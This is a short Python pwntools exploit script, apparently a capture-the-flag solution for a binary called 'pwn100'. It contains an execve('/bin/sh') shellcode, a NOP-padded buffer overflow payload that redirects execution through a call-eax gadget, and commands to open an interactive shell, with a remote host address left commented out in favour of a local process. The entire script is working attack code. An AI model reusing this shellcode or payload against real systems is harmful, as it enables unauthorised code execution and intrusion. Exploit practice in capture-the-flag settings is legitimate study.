from pwn import *

host = "54.153.19.139"
port = 5252

#r = remote(host,port)
r=process('./pwn100')

call_eax=0x08048386
##
shellcode="\x31\xC0\x31\xC9\x31\xD2\x31\xF6\xB8\x0B\x00\x00\x00\x8D\x5C\x24\xF8\xCD\x80"
shellcode+= '/bin/sh\x00'
payload="\x90"*(28-len(shellcode))
payload+=shellcode
payload+=p32(call_eax)

print len(payload)

r.sendline(payload)

r.sendline("ls -al")


r.interactive()
